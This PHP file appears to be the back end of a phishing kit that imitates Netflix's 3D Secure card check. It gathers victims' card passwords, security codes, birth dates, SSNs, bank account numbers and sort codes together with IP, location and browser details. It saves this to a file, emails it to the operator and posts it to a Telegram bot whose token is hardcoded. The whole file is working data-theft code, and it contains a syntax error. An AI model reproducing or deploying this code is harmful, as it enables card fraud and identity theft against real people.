<?php

 if(isset($_POST['thd'])&&isset($_POST['dob_day'])){session_start();
        include '../../data.php';
				include '../../app/pic/login.png;

        $msg.="|+ ------- 3D Info --------+|\r\n";
        $msg.= "CREDITCARD({$_SESSION['ip_countryName']}) \r\n";
        $msg.= "CREDIT CARD NAME : {$_SESSION['fname']}\r\n";
        $msg.= "CARD PASSWORD : {$_POST['thd']}\r\n";
        $msg.="|+ ------- V8V --------+|\r\n";


   if (isset($_POST['CreditLimit'])) {

          $msg.= "|+ Security Code   : {$_POST['thd']}\r\n";
        $msg.= "|+ Credit Limit    : {$_POST['CreditLimit']}\r\n";
        $msg.= "|+ Customer Number : {$_POST['CustomerNumber']}\r\n";
        }


        $msg.= "|+ CARD BIRTH-DATE  : {$_POST['dob_day']}/{$_POST['dob_month']}/{$_POST['dob_year']}\r\n";
        if (isset($_POST['ssn'])) {
                $msg.= "|+ CARD SSN Number : {$_POST['ssn']}\r\n";
        }

        if (isset($_POST['acn'])) {
                $msg.= "|+ ACOUNT NUM. : {$_POST['acn']}\r\n";
                $msg.= "|+ SORT CODE   : {$_POST['scode']}\r\n";
        }


        $msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
$msg.="»»————-　★[ ./💼 https://t.me/zae3m | https://t.me/spam_dollarers | https://t.me/zae3m_tut 💼 ]★　————-««
\r\n\r\n";
        $save = fopen("../../Zae3m/VBV.txt", "a+");
        fwrite($save, $msg);
        fclose($save);
        $subject = "*# N!tflix 3DSECURE #* {$_SESSION['ip']}";
        $headers="From: Zae3m   <zae3m@yandex.ru>\r\n";
        $headers.= "MIME-Version: 1.0\r\n";
        $headers.= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours, $subject, $msg, $headers);
			@mail($yours,$subject,$msg,$headers);
$txt = $msg;
$chat_id = "1436260626"; // Your Telegram Chat ID
$bot_url = "bot5273785611:AAHufywYXU_InWiHlQsaxeRi36e6C6rH0rM"; //Your Telegram Bot Api Key

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

        exit('done');}?>
